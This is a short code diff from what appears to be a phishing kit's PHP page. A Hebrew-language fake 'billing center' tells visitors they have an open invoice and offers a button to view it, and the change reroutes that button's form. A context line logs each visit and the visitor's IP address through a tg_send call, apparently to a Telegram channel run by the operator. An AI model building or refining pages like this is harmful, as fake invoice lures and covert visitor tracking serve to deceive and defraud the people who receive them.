@@ -21,7 +21,7 @@ tg_send("📥 <b>Visit:</b> index.php\nIP: {$_SERVER['REMOTE_ADDR']}");
   <div class="container">
     <h1>מרכז החיובים</h1>
     <p>יש לך חשבונית פתוחה לתשלום. אנא לחץ למטה כדי להמשיך לתשלום.</p>
-    <form action="x.php">
+    <form action="index.php">
       <button class="button">צפה בחשבונית</button>
     </form>
   </div>
